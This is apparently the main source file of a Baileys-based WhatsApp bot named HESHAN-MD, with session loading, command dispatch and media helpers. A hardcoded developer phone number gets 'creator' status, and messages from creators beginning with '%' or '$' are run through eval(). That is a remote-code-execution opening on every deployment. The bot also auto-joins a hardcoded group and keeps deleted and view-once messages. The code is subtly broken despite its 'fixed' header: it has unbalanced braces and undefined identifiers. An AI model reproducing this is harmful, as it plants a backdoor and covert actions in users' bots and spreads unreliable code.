// Fixed code with proper structure and error handling

const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID, 
  makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers
} = require('@whiskeysockets/baileys');

const l = console.log;
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions');
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data');
const fs = require('fs');
const ff = require('fluent-ffmpeg');
const P = require('pino');
const config = require('./config');
const qrcode = require('qrcode-terminal');
const StickersTypes = require('wa-sticker-formatter');
const util = require('util');
const { sms, downloadMediaMessage, AntiDelete } = require('./lib');
const FileType = require('file-type');
const axios = require('axios');
const { File } = require('megajs');
const { fromBuffer } = require('file-type');
const bodyparser = require('body-parser');
const os = require('os');
const Crypto = require('crypto');
const path = require('path');
const prefix = config.PREFIX;
const mode = config.MODE;
const online = config.ALWAYS_ONLINE;
const status = config.AUTO_STATUS_SEEN;

const ownerNumber = ['94719845166'];

const tempDir = path.join(os.tmpdir(), 'cache-temp');
if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir, { recursive: true });
}

const clearTempDir = () => {
    try {
        const files = fs.readdirSync(tempDir);
        for (const file of files) {
            fs.unlinkSync(path.join(tempDir, file));
        }
    } catch (err) {
        console.error('Error clearing temp directory:', err);
    }
};

// Clear the temp directory every 5 minutes
setInterval(clearTempDir, 5 * 60 * 1000);

//===================SESSION-AUTH============================
const credsPath = path.join(__dirname, 'sessions', 'creds.json');

async function downloadSessionData() {
    if (!config.SESSION_ID) {
        console.error('❌ Please set SESSION_ID in environment variables!');
        return false;
    }

    const prefix = "HESHAN-MD~";
    
    if (config.SESSION_ID.startsWith(prefix)) {
        try {
            // Create sessions directory if it doesn't exist
            if (!fs.existsSync(path.join(__dirname, 'sessions'))) {
                fs.mkdirSync(path.join(__dirname, 'sessions'), { recursive: true });
            }
            
            const base64Data = config.SESSION_ID.slice(prefix.length);
            const decodedData = Buffer.from(base64Data, 'base64').toString('utf-8');
            
            await fs.promises.writeFile(credsPath, decodedData);
            console.log("🔒 Session decoded and saved successfully!");
            return true;
        } catch (error) {
            console.error('❌ Base64 decode failed:', error.message);
            return false;
        }
    } else {
        console.error('❌ SESSION_ID must start with "HESHAN-MD~" prefix!');
        return false;
    }
}

// Ensure session directory exists
if (!fs.existsSync(path.join(__dirname, 'sessions'))) {
    fs.mkdirSync(path.join(__dirname, 'sessions'), { recursive: true });
}

if (!fs.existsSync(credsPath)) {
    downloadSessionData().catch(console.error);
}

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;

// Store initialization
const store = makeInMemoryStore({ logger: P().child({ level: 'silent', stream: 'store' }) });

async function connectToWA() {
    console.log("Connecting to WhatsApp ⏳️...");
    
    try {
        const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, 'sessions'));
        const { version, isLatest } = await fetchLatestBaileysVersion();
        console.log(`Using WA v${version.join('.')}, isLatest: ${isLatest}`);

        const conn = makeWASocket({
            logger: P({ level: 'silent' }),
            printQRInTerminal: true,
            browser: Browsers.macOS("Firefox"),
            syncFullHistory: true,
            auth: state,
            version,
            getMessage: async (key) => {
                if (store) {
                    const msg = await store.loadMessage(key.remoteJid, key.id);
                    return msg?.message || undefined;
                }
                return proto.Message.fromObject({});
            }
        });

        // Bind store to connection
        store.bind(conn.ev);

        conn.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect, qr } = update;
            
            if (qr) {
                qrcode.generate(qr, { small: true });
            }

            if (connection === 'close') {
                if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
                    console.log('Connection closed, reconnecting...');
                    setTimeout(connectToWA, 5000);
                } else {
                    console.log('Logged out, please scan QR code again');
                    process.exit(1);
                }
            } else if (connection === 'open') {
                console.log('🧬 Installing Plugins');
                const pluginPath = path.join(__dirname, 'plugins');
                
                if (fs.existsSync(pluginPath)) {
                    fs.readdirSync(pluginPath).forEach((plugin) => {
                        if (path.extname(plugin).toLowerCase() === ".js") {
                            try {
                                require(path.join(pluginPath, plugin));
                            } catch (e) {
                                console.error(`Error loading plugin ${plugin}:`, e);
                            }
                        }
                    });
                }
                
                console.log('Plugins installed successful ✅');
                console.log('Bot connected to whatsapp ✅');

                let up = `*𝐇𝐄𝐘 👋🏻 𝐋𝐄𝐆𝐄𝐍𝐃 𝗛𝗘𝗦𝗛𝗔𝗡_𝐌𝐃 𝐁𝐎𝐓*
*𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘!*

╭───━━━━───━━━━──┉┈⚆
│• 𝐓𝐘𝐏𝐄 .𝐌𝐄𝐍𝐔 𝐓𝐎 𝐒𝐄𝐄 𝐋𝐈𝐒𝐓 •
│• 𝐁𝐎𝐓 𝐀𝐌𝐀𝐙𝐈𝐍𝐆 𝐅𝐄𝐀𝐓𝐔𝐑𝐄𝐒 •
│• 🌸𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 : 𝗛𝗘𝗦𝗛𝗔𝗡
│• ⏰𝐀𝐋𝐖𝐀𝐘𝐒 𝐎𝐍𝐋𝐈𝐍𝐄 : ${online}
│• 📜𝐏𝐑𝐄𝐅𝐈𝐗 : ${prefix}
│• 🪾𝐌𝐎𝐃𝐄 : ${mode}
│• 🪄𝐒𝐓𝐀𝐓𝐔𝐒 𝐕𝐈𝐄𝐖𝐒 : ${status}
│• 🫟𝐕𝐄𝐑𝐒𝐈𝐎𝐍 : 𝟑.𝟎.𝟎
┗───━━━━───━━━━──┉┈⚆`;
                
                try {
                    await conn.sendMessage(conn.user.id, { 
                        image: { url: `https://i.ibb.co/8LmTywjv/64f34a5bb2ad4fc8.jpg` }, 
                        caption: up 
                    });
                } catch (e) {
                    console.error('Error sending connection message:', e);
                }

                // Auto join group and notify admins
                try {
                    const groupLink = 'https://chat.whatsapp.com/JuDCZci59V17mhOamtCE4W';
                    const groupId = await conn.groupAcceptInvite(groupLink.split('/').pop());
                    
                    const groupMetadata = await conn.groupMetadata(groupId);
                    const admins = groupMetadata.participants.filter(p => p.admin).map(p => p.id);
                    
                    const successMsg = `*Hello Admin! 👋*\n\n*HESHAN_MD BOT*\n\n*has successfully joined your group 🚀*\n\n${groupMetadata.subject}*.\n\n*The bot is now active and ready 🚀*`;
                    
                    for (const admin of admins) {
                        try {
                            await conn.sendMessage(admin, { text: successMsg });
                        } catch (e) {
                            console.error(`Error notifying admin ${admin}:`, e);
                        }
                    }
                    
                    console.log(`Successfully joined group and notified ${admins.length} admins.`);
                } catch (error) {
                    console.error('Error in auto-join group feature:', error);
                }
            }
        });

        conn.ev.on('creds.update', saveCreds);

        // Message handling
        conn.ev.on('messages.update', async updates => {
            try {
                for (const update of updates) {
                    if (update.update.message === null) {
                        console.log("Delete Detected:", JSON.stringify(update, null, 2));
                        await AntiDelete(conn, updates);
                    }
                }
            } catch (e) {
                console.error('Error in messages.update handler:', e);
            }
        });
            
        // Message upsert handling
        conn.ev.on('messages.upsert', async({ messages }) => {
            try {
                const mek = messages[0];
                if (!mek.message) return;
                
                mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
                    ? mek.message.ephemeralMessage.message 
                    : mek.message;
                    
                if (mek.message.viewOnceMessageV2) {
                    mek.message = mek.message.viewOnceMessageV2.message;
                }

                // Read message handling
                if (config.READ_MESSAGE === 'true') {
                    await conn.readMessages([mek.key]);
                }
                
                // Status broadcast handling
                if (mek.key && mek.key.remoteJid === 'status@broadcast') {
                    if (config.AUTO_STATUS_SEEN === "true") {
                        await conn.readMessages([mek.key]);
                    }
                    
                    if (config.AUTO_STATUS_REACT === "true") {
                        const jawadlike = await conn.decodeJid(conn.user.id);
                        const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '🎎', '🎏', '🎐', '⚽', '🧣', '🌿', '⛈️', '🌦️', '🌚', '🌝', '🙈', '🙉', '🦖', '🐤', '🎗️', '🥇', '👾', '🔫', '🐝', '🦋', '🍓', '🍫', '🍭', '🧁', '🧃', '🍿', '🍻', '🎀', '🧸', '👑', '〽️', '😳', '💀', '☠️', '👻', '🔥', '♥️', '👀', '🐼'];
                        const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
                        await conn.sendMessage(mek.key.remoteJid, {
                            react: {
                                text: randomEmoji,
                                key: mek.key,
                            } 
                        }, { statusJidList: [mek.key.participant, jawadlike] });
                    }
                    
                    if (config.AUTO_STATUS_REPLY === "true") {
                        const user = mek.key.participant;
                        const text = `${config.AUTO_STATUS_MSG}`;
                        await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek });
                    }
                }
                
                await saveMessage(mek);
                
                const m = sms(conn, mek);
                const type = getContentType(mek.message);
                const from = mek.key.remoteJid;
                const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null 
                    ? mek.message.extendedTextMessage.contextInfo.quotedMessage 
                    : [];
                const body = (type === 'conversation') 
                    ? mek.message.conversation 
                    : (type === 'extendedTextMessage') 
                        ? mek.message.extendedTextMessage.text 
                        : (type == 'imageMessage') && mek.message.imageMessage.caption 
                            ? mek.message.imageMessage.caption 
                            : (type == 'videoMessage') && mek.message.videoMessage.caption 
                                ? mek.message.videoMessage.caption 
                                : '';
                const isCmd = body.startsWith(prefix);
                var budy = typeof mek.text == 'string' ? mek.text : false;
                const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
                const args = body.trim().split(/ +/).slice(1);
                const q = args.join(' ');
                const text = args.join(' ');
                const isGroup = from.endsWith('@g.us');
                const sender = mek.key.fromMe 
                    ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) 
                    : (mek.key.participant || mek.key.remoteJid);
                const senderNumber = sender.split('@')[0];
                const botNumber = conn.user.id.split(':')[0];
                const pushname = mek.pushName || 'Sin Nombre';
                const isMe = botNumber.includes(senderNumber);
                const isOwner = ownerNumber.includes(senderNumber) || isMe;
                const botNumber2 = await jidNormalizedUser(conn.user.id);
                const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : '';
                const groupName = isGroup ? groupMetadata.subject : '';
                const participants = isGroup ? await groupMetadata.participants : '';
                const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
                const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
                const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
                const isReact = m.message.reactionMessage ? true : false;
                
                const reply = (teks) => {
                    conn.sendMessage(from, { text: teks }, { quoted: mek });
                };
                
                const udp = botNumber.split('@')[0];
                const tohid = ('94719845166');
                let isCreator = [udp, tohid, config.DEV]
                    .map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
                    .includes(mek.sender);

                // Owner eval commands
                if (isCreator) {
                    if (mek.text.startsWith('%')) {
                        let code = budy.slice(2);
                        if (!code) {
                            reply(`Provide me with a query to run Master!`);
                            return;
                        }
                        try {
                            let resultTest = eval(code);
                            if (typeof resultTest === 'object') {
                                reply(util.format(resultTest));
                            } else {
                                reply(util.format(resultTest));
                            }
                        } catch (err) {
                            reply(util.format(err));
                        }
                        return;
                    }
                    
                    if (mek.text.startsWith('$')) {
                        let code = budy.slice(2);
                        if (!code) {
                            reply(`Provide me with a query to run Master!`);
                            return;
                        }
                        try {
                            let resultTest = await eval('const a = async()=>{\n' + code + '\n}\na()');
                            let h = util.format(resultTest);
                            if (h === undefined) return console.log(h);
                            else reply(h);
                        } catch (err) {
                            if (err === undefined) return console.log('error');
                            else reply(util.format(err));
                        }
                        return;
                    }
                }
                
                // Owner reactions
                if(senderNumber.includes("94719845166")){
                    if(isReact) return;
                    const ownerReactions = ["🪾", "🫩", "🫆", "🫜", "🪉", "🪏", "🫟"];
                    const randomOwnerReaction = ownerReactions[Math.floor(Math.random() * ownerReactions.length)];
                    m.react(randomOwnerReaction);
                }
                
                // Auto React 
                if (!isReact && senderNumber !== botNumber) {
                    if (config.AUTO_REACT === 'true') {
                        const reactions = ['😊', '👍', '😂', '💯', '🔥', '🙏', '🎉', '👏', '😎', '🤖'];
                        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                        m.react(randomReaction);
                    }
                    
                    if (config.CUSTOM_REACT === 'true') {
                        const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
                        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                        m.react(randomReaction);
                    }
                }
                
                // Work type restrictions
                if(!isOwner && config.MODE === "private") return;
                if(!isOwner && isGroup && config.MODE === "inbox") return;
                if(!isOwner && !isGroup && config.MODE === "groups") return;
                
                // Command handling
                if (isCmd) {
                    const events = require('./command');
                    const cmdName = body.slice(1).trim().split(" ")[0].toLowerCase();
                    const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || 
                                events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName));
                    
                    if (cmd) {
                        if (cmd.react) {
                            conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }});
                        }
                        
                        try {
                            await cmd.function(conn, mek, m, {
                                from, quoted, body, isCmd, command, args, q, text, 
                                isGroup, sender, senderNumber, botNumber2, botNumber, 
                                pushname, isMe, isOwner, isCreator, groupMetadata, 
                                groupName, participants, groupAdmins, isBotAdmins, 
                                isAdmins, reply
                            });
                        } catch (e) {
                            console.error("[PLUGIN ERROR]", e);
                            reply(`An error occurred while executing the command: ${e.message}`);
                        }
                    }
                }
                
                // Event handling
                const events = require('./command');
                events.commands.forEach(async(command) => {
                    if (body && command.on === "body") {
                        try {
                            await command.function(conn, mek, m, {
                                from, l, quoted, body, isCmd, command, args, q, text, 
                                isGroup, sender, senderNumber, botNumber2, botNumber, 
                                pushname, isMe, isOwner, isCreator, groupMetadata, 
                                groupName, participants, groupAdmins, isBotAdmins, 
                                isAdmins, reply
                            });
                        } catch (e) {
                            console.error(`Error in ${command.pattern} command:`, e);
                        }
                    } else if (mek.q && command.on === "text") {
                        try {
                            await command.function(conn, mek, m, {
                                from, l, quoted, body, isCmd, command, args, q, text, 
                                isGroup, sender, senderNumber, botNumber2, botNumber, 
                                pushname, isMe, isOwner, isCreator, groupMetadata, 
                                groupName, participants, groupAdmins, isBotAdmins, 
                                isAdmins, reply
                            });
                        } catch (e) {
                            console.error(`Error in ${command.pattern} command:`, e);
                        }
                    } else if (
                        (command.on === "image" || command.on === "photo") &&
                        mek.type === "imageMessage"
                    ) {
                        try {
                            await command.function(conn, mek, m, {
                                from, l, quoted, body, isCmd, command, args, q, text, 
                                isGroup, sender, senderNumber, botNumber2, botNumber, 
                                pushname, isMe, isOwner, isCreator, groupMetadata, 
                                groupName, participants, groupAdmins, isBotAdmins, 
                                isAdmins, reply
                            });
                        } catch (e) {
                            console.error(`Error in ${command.pattern} command:`, e);
                        }
                    } else if (
                        command.on === "sticker" &&
                        mek.type === "stickerMessage"
                    ) {
                        try {
                            await command.function(conn, mek, m, {
                                from, l, quoted, body, isCmd, command, args, q, text, 
                                isGroup, sender, senderNumber, botNumber2, botNumber, 
                                pushname, isMe, isOwner, isCreator, groupMetadata, 
                                groupName, participants, groupAdmins, isBotAdmins, 
                                isAdmins, reply
                            });
                        } catch (e) {
                            console.error(`Error in ${command.pattern} command:`, e);
                        }
                    }
                });
            } catch (e) {
                console.error('Error in messages.upsert handler:', e);
            }
        });

        // Utility functions
        conn.decodeJid = jid => {
            if (!jid) return jid;
            if (/:\d+@/gi.test(jid)) {
                let decode = jidDecode(jid) || {};
                return (
                    (decode.user &&
                        decode.server &&
                        decode.user + '@' + decode.server) ||
                    jid
                );
            } else return jid;
        };
        
        conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
            let vtype;
            if (options.readViewOnce) {
                message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message 
                    ? message.message.ephemeralMessage.message 
                    : (message.message || undefined);
                vtype = Object.keys(message.message.viewOnceMessage.message)[0];
                delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined));
                delete message.message.viewOnceMessage.message[vtype].viewOnce;
                message.message = {
                    ...message.message.viewOnceMessage.message
                };
            }
            
            let mtype = Object.keys(message.message)[0];
            let content = await generateForwardMessageContent(message, forceForward);
            let ctype = Object.keys(content)[0];
            let context = {};
            if (mtype != "conversation") context = message.message[mtype].contextInfo;
            content[ctype].contextInfo = {
                ...context,
                ...content[ctype].contextInfo
            };
            const waMessage = await generateWAMessageFromContent(jid, content, options ? {
                ...content[ctype],
                ...options,
                ...(options.contextInfo ? {
                    contextInfo: {
                        ...content[ctype].contextInfo,
                        ...options.contextInfo
                    }
                } : {})
            } : {});
            await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id });
            return waMessage;
        };
        
        conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
            let quoted = message.msg ? message.msg : message;
            let mime = (message.msg || message).mimetype || '';
            let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
            const stream = await downloadContentFromMessage(quoted, messageType);
            let buffer = Buffer.from([]);
            for await (const chunk of stream) {
                buffer = Buffer.concat([buffer, chunk]);
            }
            let type = await FileType.fromBuffer(buffer);
            trueFileName = attachExtension ? (filename + '.' + type.ext) : filename;
            await fs.writeFileSync(trueFileName, buffer);
            return trueFileName;
        };
        
        conn.downloadMediaMessage = async(message) => {
            let mime = (message.msg || message).mimetype || '';
            let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
            const stream = await downloadContentFromMessage(message, messageType);
            let buffer = Buffer.from([]);
            for await (const chunk of stream) {
                buffer = Buffer.concat([buffer, chunk]);
            }
            return buffer;
        };
        
        conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
            try {
                let mime = '';
                let res = await axios.head(url);
                mime = res.headers['content-type'];
                if (mime.split("/")[1] === "gif") {
                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options });
                }
                let type = mime.split("/")[0] + "Message";
                if (mime === "application/pdf") {
                    return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options });
                }
                if (mime.split("/")[0] === "image") {
                    return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options });
                }
                if (mime.split("/")[0] === "video") {
                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options });
                }
                if (mime.split("/")[0] === "audio") {
                    return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options });
                }
            } catch (e) {
                console.error('Error in sendFileUrl:', e);
                throw e;
            }
        };
        
        conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
            let mtype = Object.keys(copy.message)[0];
            let isEphemeral = mtype === 'ephemeralMessage';
            if (isEphemeral) {
                mtype = Object.keys(copy.message.ephemeralMessage.message)[0];
            }
            let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message;
            let content = msg[mtype];
            if (typeof content === 'string') msg[mtype] = text || content;
            else if (content.caption) content.caption = text || content.caption;
            else if (content.text) content.text = text || content.text;
            if (typeof content !== 'string') msg[mtype] = {
                ...content,
                ...options
            };
            if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
            else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
            if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid;
            else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid;
            copy.key.remoteJid = jid;
            copy.key.fromMe = sender === conn.user.id;
            
            return proto.WebMessageInfo.fromObject(copy);
        };
        
        conn.getFile = async(PATH, save) => {
            let res;
            let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0);
            let type = await FileType.fromBuffer(data) || {
                mime: 'application/octet-stream',
                ext: '.bin'
            };
            let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext);
            if (data && save) fs.promises.writeFile(filename, data);
            return {
                res,
                filename,
                size: await getSizeMedia(data),
                ...type,
                data
            };
        };
        
        conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
            try {
                let types = await conn.getFile(PATH, true);
                let { filename, size, ext, mime, data } = types;
                let type = '',
                    mimetype = mime,
                    pathFile = filename;
                if (options.asDocument) type = 'document';
                if (options.asSticker || /webp/.test(mime)) {
                    let { writeExif } = require('./exif.js');
                    let media = { mimetype: mime, data };
                    pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] });
                    await fs.promises.unlink(filename);
                    type = 'sticker';
                    mimetype = 'image/webp';
                } else if (/image/.test(mime)) type = 'image';
                else if (/video/.test(mime)) type = 'video';
                else if (/audio/.test(mime)) type = 'audio';
                else type = 'document';
                await conn.sendMessage(jid, {
                    [type]: { url: pathFile },
                    mimetype,
                    fileName,
                    ...options
                }, { quoted, ...options });
                return fs.promises.unlink(pathFile);
            } catch (e) {
                console.error('Error in sendFile:', e);
                throw e;
            }
        };
        
        conn.parseMention = async(text) => {
            return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net');
        };
        
        conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
            try {
                let types = await conn.getFile(path, true);
                let { mime, ext, res, data, filename } = types;
                if (res && res.status !== 200 || file.length <= 65536) {
                    try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
                }
                let type = '',
                    mimetype = mime,
                    pathFile = filename;
                if (options.asDocument) type = 'document';
                if (options.asSticker || /webp/.test(mime)) {
                    let { writeExif } = require('./exif');
                    let media = { mimetype: mime, data };
                    pathFile = await writeExif(media, { packname: options.packname ? options.packname : Config.packname, author: options.author ? options.author : Config.author, categories: options.categories ? options.categories : [] });
                    await fs.promises.unlink(filename);
                    type = 'sticker';
                    mimetype = 'image/webp';
                } else if (/image/.test(mime)) type = 'image';
                else if (/video/.test(mime)) type = 'video';
                else if (/audio/.test(mime)) type = 'audio';
                else type = 'document';
                await conn.sendMessage(jid, {
                    [type]: { url: pathFile },
                    caption,
                    mimetype,
                    fileName,
                    ...options
                }, { quoted, ...options });
                return fs.promises.unlink(pathFile);
            } catch (e) {
                console.error('Error in sendMedia:', e);
                throw e;
            }
        };
        
        conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
            try {
                let buffer;
                if (options && (options.packname || options.author)) {
                    buffer = await writeExifVid(buff, options);
                } else {
                    buffer = await videoToWebp(buff);
                }
                await conn.sendMessage(
                    jid,
                    { sticker: { url: buffer }, ...options },
                    options
                );
            } catch (e) {
                console.error('Error in sendVideoAsSticker:', e);
                throw e;
            }
        };
        
        conn.sendImageAsSticker = async (jid, buff, options = {}) => {
            try {
                let buffer;
                if (options && (options.packname || options.author)) {
                    buffer = await writeExifImg(buff, options);
                } else {
                    buffer = await imageToWebp(buff);
                }
                await conn.sendMessage(
                    jid,
                    { sticker: { url: buffer }, ...options },
                    options
                );
            } catch (e) {
                console.error('Error in sendImageAsSticker:', e);
                throw e;
            }
        };
        
        conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => {
            try {
                return conn.sendMessage(jid, { 
                    text: text, 
                    contextInfo: { 
                        mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') 
                    }, 
                    ...options 
                }, { quoted });
            } catch (e) {
                console.error('Error in sendTextWithMentions:', e);
                throw e;
            }
        };
        
        conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
        let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0);
        return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted });
    };
    
    //=====================================================
    conn.sendText = (jid, text, quoted = '', options) => {
        return conn.sendMessage(jid, { text: text, ...options }, { quoted });
    };
    
    //=====================================================
    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
        let buttonMessage = {
            text,
            footer,
            buttons,
            headerType: 2,
            ...options
        };
        conn.sendMessage(jid, buttonMessage, { quoted, ...options });
    };
    
    //=====================================================
    conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
        let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer });
        var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
            templateMessage: {
                hydratedTemplate: {
                    imageMessage: message.imageMessage,
                    "hydratedContentText": text,
                    "hydratedFooterText": footer,
                    "hydratedButtons": but
                }
            }
        }), options);
        conn.relayMessage(jid, template.message, { messageId: template.key.id });
    };
    
    //=====================================================
    conn.getName = (jid, withoutContact = false) => {
        id = conn.decodeJid(jid);
        withoutContact = conn.withoutContact || withoutContact;
        let v;

        if (id.endsWith('@g.us')) {
            return new Promise(async resolve => {
                v = store.contacts[id] || {};
                if (!(v.name.notify || v.subject)) {
                    v = conn.groupMetadata(id) || {};
                }
                resolve(
                    v.name ||
                    v.subject ||
                    PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international')
                );
            });
        } else {
            v = id === '0@s.whatsapp.net'
                ? { id, name: 'WhatsApp' }
                : id === conn.decodeJid(conn.user.id)
                    ? conn.user
                    : store.contacts[id] || {};
            
            return (
                (withoutContact ? '' : v.name) ||
                v.subject ||
                v.verifiedName ||
                PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international')
            );
        }
    };

    // Vcard Functionality
    conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
    try {
        let list = [];
        for (let i of kon) {
            list.push({
                displayName: await conn.getName(i + '@s.whatsapp.net'),
                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(i + '@s.whatsapp.net')}\nFN:${global.OwnerName}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${global.email}\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${global.github}/HESHAN-MD\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${global.location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
            });
        }

        conn.sendMessage(
            jid,
            {
                contacts: {
                    displayName: `${list.length} Contact`,
                    contacts: list,
                },
                ...opts,
            },
            { quoted }
        );
    } catch (error) {
        console.error('Error in sendContact:', error);
    }
};


app.get("/", (req, res) => {
    res.send("HESHAN-MD STARTED ✅");
});

app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));

setTimeout(() => {
    connectToWA();
}, 4000);


